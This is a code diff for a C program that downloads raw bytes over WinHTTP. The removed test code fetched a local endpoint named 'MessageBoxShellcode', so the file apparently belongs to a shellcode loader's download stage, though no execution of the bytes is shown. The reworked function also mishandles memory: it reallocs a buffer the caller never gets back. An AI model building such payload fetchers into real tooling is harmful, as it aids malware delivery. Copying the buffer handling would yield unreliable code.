@@ -1,21 +1,9 @@
+#include <stdio.h>
 #include <windows.h>
 #include <winhttp.h>
-#include <malloc.h>
 #include "webreq.h"
 
-int main() {
-    unsigned char* response = fetch_url("http://localhost:3000/MessageBoxShellcode");
-    printf("Response: ");
-    for (int i = 0; i < 500; i++) { // For demonstration, printing first 100 bytes
-        printf("%02x ", response[i]);
-    }
-    printf("\n");
-
-    // Don't forget to free the allocated memory
-    free(response);
-}
-
-unsigned char* fetch_url(const char* url) {
+void fetch_url(const char* url, unsigned char* response, size_t* responseSize) {
     WCHAR wUrl[100];
     MultiByteToWideChar(CP_UTF8, 0, url, (int)strlen(url), wUrl, 100);
 
@@ -37,48 +25,69 @@ unsigned char* fetch_url(const char* url) {
     LPCWSTR host = wcstok(hostlong, L":");
     INTERNET_PORT port = urlComp.nPort;
     LPWSTR path = urlComp.lpszUrlPath;
-    printf("%ls, %d, %ls\n", host, port, path);
-   
-    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
 
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
-    if (!hRequest) {
-       printf("%lu", GetLastError());
-       WinHttpCloseHandle(hConnect);
-       WinHttpCloseHandle(hSession);
-       return NULL;
+
+
+    BOOL bResults = FALSE;
+    HINTERNET hConnect = NULL, hRequest = NULL;
+
+
+    hConnect = WinHttpConnect(hSession, host, port, 0);
+
+    hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
+                                      NULL, WINHTTP_NO_REFERER,
+                                      WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                      0);
+    if (hRequest) {
+        bResults = WinHttpSendRequest(hRequest,
+                                      WINHTTP_NO_ADDITIONAL_HEADERS,
+                                      0, WINHTTP_NO_REQUEST_DATA, 0,
+                                      0, 0);
     }
-    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
-    WinHttpReceiveResponse(hRequest, NULL);
 
-    DWORD dwSize = 0;
-    DWORD dwDownloaded = 0;
-    unsigned char* response = (unsigned char*)malloc(10000);  // Allocate space for response
-    memset(response, 0, 10000);  // Initialize memory to zero
 
-    unsigned char* currentPosition = response;  // Pointer to track where to append data
 
-    do {
-        dwSize = 0;
-        WinHttpQueryDataAvailable(hRequest, &dwSize);
+    size_t totalDownloaded = 0;
 
-        unsigned char* pszOutBuffer = (unsigned char*)malloc(dwSize);
-        if (pszOutBuffer) {
-            ZeroMemory(pszOutBuffer, dwSize);
-            WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);
+    if (hRequest && WinHttpReceiveResponse(hRequest, NULL)) {
+        DWORD dwDownloaded, dwSize;
+        do {
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize) || dwSize == 0)
+                break;
 
-            // Append to the response buffer (raw byte data, no string operations)
-            memcpy(currentPosition, pszOutBuffer, dwDownloaded);
-            currentPosition += dwDownloaded;  // Move pointer forward
-            free(pszOutBuffer);
-        }
-    } while (dwSize > 0);
+            unsigned char* buf = malloc(dwSize);
+            if (!buf)
+                break;
 
-    // Cleanup
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+            if (!WinHttpReadData(hRequest, (LPVOID)buf, dwSize, &dwDownloaded)) {
+                free(buf);
+                break;
+            }
 
-    return response;  // Return the raw byte array
+            if (totalDownloaded + dwDownloaded > *responseSize) {
+                *responseSize = totalDownloaded + dwDownloaded;
+                unsigned char* temp = realloc(response, *responseSize);
+                if (!temp) {
+                    free(buf);
+                    break;
+                }
+                response = temp;
+            }
+            memcpy(response + totalDownloaded, buf, dwDownloaded);
+            totalDownloaded += dwDownloaded;
+            free(buf);
+
+        } while (dwSize > 0);
+    }
+    for (size_t i=0; i<totalDownloaded; i++) {
+        printf("%c",response[i]);
+    }
+
+    if (hRequest)
+        WinHttpCloseHandle(hRequest);
+    if (hConnect)
+        WinHttpCloseHandle(hConnect);
+    if (hSession)
+        WinHttpCloseHandle(hSession);
+
 }
-
